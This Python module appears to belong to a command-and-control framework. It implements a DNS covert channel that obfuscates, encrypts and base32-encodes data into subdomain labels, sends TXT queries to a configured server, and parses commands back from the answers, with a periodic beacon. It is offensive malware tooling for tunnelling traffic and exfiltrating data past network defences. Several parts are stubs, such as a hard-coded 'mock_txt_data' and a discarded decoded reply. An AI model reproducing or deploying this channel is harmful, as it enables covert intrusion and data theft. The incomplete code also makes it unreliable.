import socket
import base64
import random
import dns.message
import dns.query
from core.channels import BaseChannel
from core.obfuscation import DataObfuscator

class DNSCovertChannel(BaseChannel):
    def __init__(self, config: dict):
        super().__init__(config)
        self.domain = config['domain']
        self.server = config['dns_server']
        self.obfuscator = DataObfuscator()
        
    def init(self) -> bool:
        try:
            socket.gethostbyname(self.domain)  # Test resolvability
            self.available = True
            return True
        except:
            self.available = False
            return False
    
    def is_available(self) -> bool:
        return self.available
    
    def encode_for_dns(self, data: str) -> str:
        """Chunk into subdomains (63 char limit)"""
        encoded = base64.b32encode(self.obfuscator.obfuscate(data.encode())).decode().rstrip('=').lower()
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        return '.'.join(chunks) + '.' + self.domain
    
    def send_command(self, command_data: dict, task_id: str) -> bool:
        try:
            encrypted = self.crypto.encrypt(command_data, task_id)
            query_domain = self.encode_for_dns(encrypted)
            q = dns.message.make_query(query_domain, 'TXT')
            response = dns.query.udp(q, self.server, timeout=5)
            # Parse TXT for cmd (server embeds in response)
            txt_data = [rr for rr in response.answer if rr.rdtype == 16]  # TXT
            if txt_data:
                decoded = base64.b32decode(''.join(txt_data[0].strings[0].decode().replace('.', '')))
                deobf = self.obfuscator.deobfuscate(decoded)
                # Decrypt response if needed
            return True
        except Exception:
            return False
    
    def receive_response(self, task_id: str) -> dict:
        # Beacon via query, receive in TXT
        return self.crypto.decrypt('mock_txt_data')  # Simplified
    
    def beacon(self) -> bool:
        return self.send_command({'type': 'beacon'}, '')
    
    def teardown(self):
        pass
